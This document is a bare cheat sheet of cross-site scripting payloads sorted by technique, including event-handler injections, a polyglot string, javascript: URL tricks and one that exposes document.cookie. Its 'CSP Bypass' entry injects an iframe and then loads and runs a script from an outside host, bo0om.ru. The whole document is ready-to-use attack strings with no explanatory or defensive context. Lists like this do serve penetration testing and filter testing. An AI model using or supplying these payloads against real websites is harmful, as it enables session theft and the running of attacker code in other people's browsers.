# Unique XSS Payloads and Techniques

## XSS Payloads
- `<img src="/" onerror='prompt(1)'>`
- `<svg/onload=eval(location.hash.substr(1))>#alert(1)`
- `<details/open/ontoggle=confirm('XSS')>`

## CSP Bypass
- `<script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>`

## Polyglot Payloads
- `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg*/onload=alert()//`

## Inline HTML Injection
- `" onclick=alert(1)//">click`
- `" autofocus onfocus=alert(1) "`

## JavaScript Injection
- `'?prompt\`1\`?'`
- `"})},alert(1));(function xss() {//`
- `"-alert(1)-"`

## Hyperlink Tag Injection
- `javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")`
- `/x:1/:///%01javascript:alert(document.cookie)/`
